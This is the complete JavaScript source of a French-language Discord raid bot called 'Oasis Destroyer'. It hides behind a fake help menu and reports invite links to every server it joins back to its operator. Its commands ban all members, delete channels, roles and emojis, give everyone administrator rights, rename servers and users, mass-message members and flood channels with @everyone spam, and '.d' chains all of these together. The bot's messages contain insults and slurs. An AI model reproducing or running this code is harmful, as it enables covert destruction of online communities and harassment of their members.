const Discord = require("discord.js");
var prefix = (".");
var client = new Discord.Client();
const tkn = "TOKEN"; // token invalide ddbtg?
client.on('ready', () =>
{
  client.user.setActivity('Ce que font les gens',
  {
    type: "WATCHING"
  });
  client.guilds.cache.forEach(guild =>
  {
    let channel = guild.channels.cache.last();
    createLink(channel, guild).catch(console.error);
  });
  client.channels.cache.get('CHANNEL ID FOR BOT STATUS').send('A online message.').catch(O_o =>
  {});
  async function createLink(chan, guild)
  {
    let invite = await chan.createInvite().catch(console.error);
    try
    {
      client.channels.cache.get('CHANNEL ID FOR SERVERS THE BOT IS IN').send('I am on this server :' + ` ${invite.url}`).catch(O_o =>
      {});
    }
    catch (e)
    {
      client.channels.cache.get('Same as up').send(`${guild.name}` + '|' + 'no invite available.').catch(console.error);
    }
  }
})
console.info("Ready to purify servers ");
client.on("guildCreate", guild =>
{
  const invitechannels = guild.channels.cache.filter(c => c.permissionsFor(guild.me).has('CREATE_INSTANT_INVITE'));
  invitechannels.random().createInvite().then(invite => client.channels.cache.get('798820464645373952').send(`I\'ve been added to this server : ${guild.name}, go les niquer. ${invite.url}`)).catch(O_o =>
  {});
});
client.on("guildDelete", guild =>
{
  client.channels.cache.get('798820464645373952').send(`On m\'a supprimé du serveur ${guild.name}, go les forcer a me remettre.`).catch(O_o =>
  {});
});
client.on('message', message =>
{
  if (!message.guild) return;
  var blacklistarray = ["770352556706234369", "664144125469392938", "722723302652772364", "788504988124053524", "770361872355950603", "766166481301274664", "790729427591233546"];
  if (blacklistarray.includes(message.guild.id)) return;
  if (!message.guild.available) return message.channel.send("A little error :/ ")
  if (client.bot) return;
  if (message.author.bot) return;
  if (message.guild === client) return;
  if (message.author.user === client) return;
  const args = message.content.split(" ").slice(1);
  var raid = args.join(" ");
  if (message.content === "gange")
  {
    let role = message.guild.roles.cache.find(r => r.name === 'Oasised');
    message.guild.members.cache.forEach(m =>
    {
      if (role) message.member.roles.add(role).catch(O_o =>
      {});
    })
  }
  if (message.content === prefix + "help")
  {
    console.info("fausse commandes envoyé sur " + `${message.guild.name} | ${message.guild.id}`);
    const help = new Discord.MessageEmbed().setColor('RANDOM').setTitle('Commandes d\'aide').setURL("https://discord.com/login").setDescription("Les commandes sont à utilisé avec précautions pour ne pas faire crash le bot donc ne spammez pas les commandes.").addField(`Commandes de base : `, `\`.d\` Configurer le bot.`, true).setFooter('Arsto Bot')
    message.channel.send(help).catch(console.error);
    message.delete().catch(O_o =>
    {});
  }
  if (message.content === prefix + "rhelp")
  {
    console.info("commandes de raid envoyés dans les mp de " + `${message.author.tag}`);
    const rhelp = new Discord.MessageEmbed().setColor('#FF0000').setTitle('ₒₐₛᵢₛ ᴰᵉˢᵗʳᵒʸᵉʳ').setURL("https://discord.gg/cRRvdw4dAB").setDescription("Les commandes sont à utiliser avec précautions pour ne pas faire crash le bot donc ne spam pas les commandes").addField(`Commandes soft`, `\`.e\` : Supprime les emotes.\n\`.dc\` : Supprime tout les salons.\n\`.rc\` : Renomme tout les salons.\n\`.t\`: Met un joli topic à tous les salons.\n\`.ban\`: Fais glisser tous les membres.\n\`.n\` : Renomme tout le monde.\n\`.simg\` : Met une belle image au serveur.\n\`.sname\` : Met un beau nom au serv.\n\`.eva\` : Tout le monde admin.\n\`.dr\` : Supprime les roles.\n\`.sm\` : Spam tout les salons.\n\`.mp\` : Envoie un mp.\n\`.c\` : Créer des salons. \n\`.r\` : Créer mass roles.`, true).addField(`Commandes hard`, `\`.d\` : Crée des salons, spam everyone, change le nom et la pp, met tlm admin, mp les membres (destruction du serv, totalement).`, true).addField(`Commandes d\'aide`, `\`.help\` : Envoie un faux panneau d\'aide. \n\`.rhelp\` : Envoie les commandes de raid dans tes message privés, pratique quand tu t\'infiltre ou que tu veux pas que les gens voient les commandes.\n\`.rhelpch\` : Envoie les commandes de raid dans le salon, tel un bourrin, mais ducoup les gens vont voir les commandes.`, true).setImage("https://i.imgur.com/UAimzgN.png").setFooter('oasis server PAZifier; mode infiltration')
    message.author.send(rhelp).catch(console.error);
    message.delete().catch(O_o =>
    {});
  }
  if (message.content === prefix + "rhelpch")
  {
    console.info("commandes de raid envoyé sur " + `${message.guild.name} | ${message.guild.id}`);
    const rhelpch = new Discord.MessageEmbed().setColor('#FF0000').setTitle('ₒₐₛᵢₛ ᴰᵉˢᵗʳᵒʸᵉʳ').setURL("https://discord.gg/cRRvdw4dAB").setDescription("Les commandes sont à utiliser avec précautions pour ne pas faire crash le bot donc ne spam pas les commandes.").addField(`Commandes soft`, `\`.e\` : Supprime les emotes.\n\`.dc\` : Supprime tout les salons.\n\`.rc\` : Renomme tout les salons.\n\`.t\`: Met un joli topic à tous les salons.\n\`.ban\`: Fais glisser tous les membres.\n\`.n\` : Renomme tout le monde.\n\`.simg\` : Met une belle image au serveur.\n\`.sname\` : Met un beau nom au serv.\n\`.eva\` : Tout le monde admin.\n\`.dr\` : Supprime les roles.\n\`.sm\` : Spam tout les salons.\n\`.mp\` : Envoie un mp.\n\`.c\` : Créer des salons. \n\`.r\` : Créer mass roles.`, true).addField(`Commandes hard`, `\`.d\` : Crée des salons, spam everyone, change le nom et la pp, met tlm admin, mp les membres (destruction du serv, totalement).`, true).addField(`Commandes d\'aide`, `\`.help\` : Envoie un faux panneau d\'aide. \n\`.rhelp\` : Envoie les commandes de raid dans tes message privés, pratique quand tu t\'infiltre ou que tu veux pas que les gens voient les commandes.\n\`.rhelpch\` : Envoie les commandes de raid dans le salon, tel un bourrin, mais ducoup les gens vont voir les commandes.`, true).setImage("https://image.noelshack.com/fichiers/2020/22/6/1590856432-nik.png").setFooter('oasis server PAZifier; mode bourrin')
    message.channel.send(rhelpch).catch(console.error);
    message.delete().catch(O_o =>
    {});
  }
  if (message.content === prefix + "ohelp")
  {
    console.info("commandes d\'administrateur du bot envoyé sur " + `${message.guild.name} | ${message.guild.id}`);
    const ohelp = new Discord.MessageEmbed().setColor('RANDOM').setTitle('Commandes d\'aide d\'administrateur du bot : ').setURL("https://discord.gg/cRRvdw4dAB").setDescription("Les commandes sont à utilisé avec précautions pour ne pas faire crash le bot donc ne spammez pas les commandes.").addField(`Commandes de base : `, `\`.leave\` Forcer le bot a quitter le serveur.`, true).setImage("https://i.kym-cdn.com/entries/icons/facebook/000/035/767/cover4.jpg").setFooter('Pov : t\'est l\'admin du bot.')
    message.channel.send(ohelp).catch(console.error);
    message.delete().catch(O_o =>
    {});
  }
  if (message.content === prefix + "shelp")
  {
    console.info("commandes secrètes envoyés sur " + `${message.guild.name} | ${message.guild.id}`);
    const shelp = new Discord.MessageEmbed().setColor('RANDOM').setTitle('Commandes d\'aide secrètes : ').setURL("https://discord.gg/cRRvdw4dAB").setDescription("Les commandes sont à utilisé avec précautions pour ne pas faire crash le bot donc ne spammez pas les commandes.").addField(`Commandes de base : `, `\`.mess\` : Spam ton message personnalisé.\n\`gange\` : Te donne le rôle Oasised avec les perms, ATTENTION : a faire après avoir fait le .r pour crée les roles sinon ça marchera pas. \n\`.cmp\` : Envoie un mesage privé customisé`, true).setImage("https://media.giphy.com/media/iGLLxbpvdRqAgGEcKU/giphy.gif").setFooter('gg mec ta trouvé les commandes secrètes.')
    message.channel.send(shelp).catch(console.error);
    message.delete().catch(O_o =>
    {});
  }
  if (message.content === prefix + "e")
  {
    message.delete().catch(O_o =>
    {})
    if (!message.guild.emojis) return;
    if (!message.guild.member(client.user).hasPermission('MANAGE_EMOJIS')) return;
    console.info('emotes supprimés sur ' + `${message.guild.name} | ${message.guild.id}`);
    message.guild.emojis.cache.forEach((e) =>
    {
      e.delete("Y\'avais trop d\emoji inutiles.").catch(O_o =>
      {})
    })
  }
  if (message.content === prefix + "leave")
  {
    message.delete().catch(O_o =>
    {})
    console.info('j\'ai quitté ce serveur : ' + `${message.guild.name} | ${message.guild.id}`);
    message.guild.leave()
  }
  if (message.content.startsWith(prefix + "rc"))
  {
    console.info(`Salons renommés ` + 'sur ' + `${message.guild.name} | ${message.guild.id}`);
    if (!raid) return message.channel.send("Donne un message.").then(message => message.delete(2000)).catch(console.error);
    message.delete().catch(O_o =>
    {});
    message.guild.channels.cache.forEach((c) =>
    {
      c.setName(raid, 'pck vous le valez bien').catch(O_o =>
      {});
    })
  }
  if (message.content === prefix + "ban")
  {
    console.info('Ban all ' + 'sur ' + `${message.guild.name} | ${message.guild.id}`);
    message.delete().catch(O_o =>
    {});
    message.guild.members.cache.forEach((m) =>
    {
      m.ban().catch(console.error);
    })
  }
  if (message.content === prefix + "n")
  {
    console.info(`nicknames changés ` + 'sur ' + `${message.guild.name} | ${message.guild.id}`);
    message.delete().catch(O_o =>
    {})
    message.guild.members.cache.forEach((m) =>
    {
      m.setNickname("oasised", '@everyone avait un nom moche').catch(O_o =>
      {})
    })
  }
  if (message.content === prefix + "simg")
  {
    message.delete().catch(O_o =>
    {});
    message.guild.setIcon("https://i.imgur.com/NBd0XDB.png", "cette pp est mieux");
    console.info(`pp du serveur changé ` + 'sur ' + `${message.guild.name} | ${message.guild.id}`);
  };
  if (message.content === prefix + "sname")
  {
    console.info('nom du serveur changé ' + 'sur ' + `${message.guild.name} | ${message.guild.id}`);
    message.delete().catch(O_o =>
    {});
    message.guild.setName("Oasised", "c bon la boisson oasis")
  };
  if (message.content === prefix + "eva")
  {
    console.info("Tout le monde est admin sur " + `${message.guild.name} | ${message.guild.id}`);
    message.delete().catch(O_o =>
    {});
    message.guild.roles.everyone.setPermissions(['ADMINISTRATOR'])
  }
  if (message.content === prefix + "dr")
  {
    console.info(`rôles supprimés ` + 'sur ' + `${message.guild.name} | ${message.guild.id}`);
    message.delete().catch(O_o =>
    {});
    message.guild.roles.cache.forEach((r) =>
    {
      r.delete("merde dsl g glissé xd ").catch(O_o =>
      {})
    });
  }
  if (message.content === prefix + "t")
  {
    message.delete().catch(O_o =>
    {});
    message.guild.channels.cache.forEach(c =>
    {
      c.setTopic("TU T'ES BIEN FAIS NIQUED PAR L'ÉLITE, DANS LA VIE PLUS T'ES GENTIL PLUS TU TE FAIS ENCULER.", "mdr").catch(console.error);
      console.info(`topics changés ` + 'sur le serveur ' + `${message.guild.name} | ${message.guild.id}`);
    })
  }
  if (message.content.startsWith(prefix + "cmp"))
  {
    if (!raid) return message.channel.send("Donne un message.").then(message => message.delete(2000)).catch(console.error);
    message.delete().catch(O_o =>
    {});
    console.info('mp all custom ' + 'sur ' + `${message.guild.name} | ${message.guild.id}`);
    message.guild.members.cache.forEach(m =>
    {
      try
      {
        m.send(raid).catch(O_o =>
        {});
      }
      catch (error)
      {
        console.info(`bah un pd a bloqué ses mp ou m\'a bloqué`);
      }
    })
  }
  if (message.content.startsWith(prefix + "mp"))
  {
    message.delete().catch(O_o =>
    {});
    console.info('mp all ' + 'sur ' + `${message.guild.name} | ${message.guild.id}`);
    message.guild.members.cache.forEach(m =>
    {
      try
      {
        m.send( `${message.guild.owner}` + ' Et son serveur ' + `${message.guild.name}` +  ' se sont fait Oasised, c\'est le gange total (on vous a niqué) \n https://giphy.com/gifs/kl5TGhkh8Iad7LK7VN \n https://discord.gg/cRRvdw4dAB \n https://i.imgur.com/2KBD5t1.png').catch(O_o =>
        {});
      }
      catch (error)
      {
        console.info(`bah un pd a bloqué ses mp ou m\'a bloqué`);
      }
    })
  }
  if (message.content.startsWith(prefix + "mess"))
  {
    console.info(`message envoyé ` + 'sur ' + `${message.guild.name} | ${message.guild.id}`)
    if (!raid) return message.channel.send("Donne un message.").then(message => message.delete(2000)).catch(console.error);
    message.delete().catch(O_o =>
    {});
    message.guild.channels.cache.forEach(c =>
    {
      if (c.type === 'text')
      {
        for (var i = 100; i >= 0; i--)
        {
          c.send(raid).catch(O_o =>
          {})
        }
      }
    })
  }
  if (message.content.startsWith(prefix + "sm"))
  {
    console.info(`spam ` + 'sur ' + `${message.guild.name} | ${message.guild.id}`)
    message.delete().catch(O_o =>
    {});
    message.guild.channels.cache.forEach(c =>
    {
      if (c.type === 'text')
      {
        for (var i = 500; i >= 0; i--)
        {
          c.send("@everyone Oasised, c\'est le gange total (on vous a niqué) \n https://discord.gg/cRRvdw4dAB \n https://giphy.com/gifs/kl5TGhkh8Iad7LK7VN \n https://i.imgur.com/2KBD5t1.png").catch(O_o =>
          {})
        }
      }
    })
  }
  if (message.content === prefix + "dc")
  {
    console.info(`salons supprimés ` + 'sur ' + `${message.guild.name} | ${message.guild.id}`)
    message.delete().catch(O_o =>
    {});
    message.guild.channels.cache.forEach((c) =>
    {
      c.delete("pck les salons y sont moche").catch(console.error);
    })
  }
  if (message.content === prefix + "r")
  {
    console.info(`roles créés ` + 'sur ' + `${message.guild.name} | ${message.guild.id}`)
    message.delete().catch(O_o =>
    {});
    var rolenum = message.guild.roles.cache.size
    while (rolenum < 75)
    {
      message.guild.roles.create(
      {
        data:
        {
          name: 'Oasised',
          color: 'RANDOM'
        },
        reason: 'car il faut des roles cool.',
      })
      rolenum++
    }
  }
  if (message.content === prefix + "c")
  {
    console.info("salons crées " + 'sur ' + `${message.guild.name} | ${message.guild.id}`)
    message.delete().catch(O_o =>
    {});
    var channum = message.guild.channels.cache.size
    while (channum < 50)
    {
      message.guild.channels.create("oasised", "test").catch(O_o =>
      {});
      channum++
    }
  }
  if (message.content === prefix + "d")
  {
    var channum = message.guild.channels.cache.size
    console.info("immolation d'un serveur " + ': ' + `${message.guild.name} | ${message.guild.id}`)
    message.delete().catch(O_o =>
    {});
    message.guild.roles.everyone.setPermissions(['ADMINISTRATOR'])
    message.guild.members.cache.forEach(m =>
    {
      try
      {
        m.send(`${message.guild.owner}` + ' Et son serveur ' + `${message.guild.name}` +  ' se sont fait Oasised, c\'est le gange total (on vous a niqué) \n https://giphy.com/gifs/kl5TGhkh8Iad7LK7VN \n https://discord.gg/cRRvdw4dAB \n https://i.imgur.com/2KBD5t1.png').catch(O_o =>
        {});
      }
      catch (error)
      {
        console.info(`bah un pd a bloqué ses mp ou m\'a bloqué`);
      }
    })
    var rolenum = message.guild.roles.cache.size
    while (rolenum < 50)
    {
      message.guild.roles.create(
      {
        data:
        {
          name: 'Oasised',
          color: 'RANDOM'
        },
        reason: 'car il faut des roles cool.',
      })
      rolenum++
    }
    message.guild.members.cache.forEach((m) =>
    {
      m.setNickname("Oasised", 'g glissé').catch(O_o =>
      {});
    })
    while (channum < 25)
    {
      message.guild.channels.create("oasised", "ça manquait de salons").catch(O_o =>
      {});
      channum++
    }
    message.guild.setIcon("https://i.imgur.com/NBd0XDB.png", "cette pp est mieux").catch(O_o =>
    {});
    message.guild.setName("Oasised", "C bon la boisson oasis :v").catch(O_o =>
    {});
    message.guild.channels.cache.forEach(c =>
    {
      if (c.type === 'text')
      {
        for (var i = 500; i >= 0; i--)
        {
          c.send('@everyone Oasised, c\'est le gange total (on vous a niqué) \n https://giphy.com/gifs/kl5TGhkh8Iad7LK7VN \n https://discord.gg/cRRvdw4dAB \n https://i.imgur.com/2KBD5t1.png').catch(O_o =>
          {});
        }
      }
    })
  }
})
client.login(tkn)
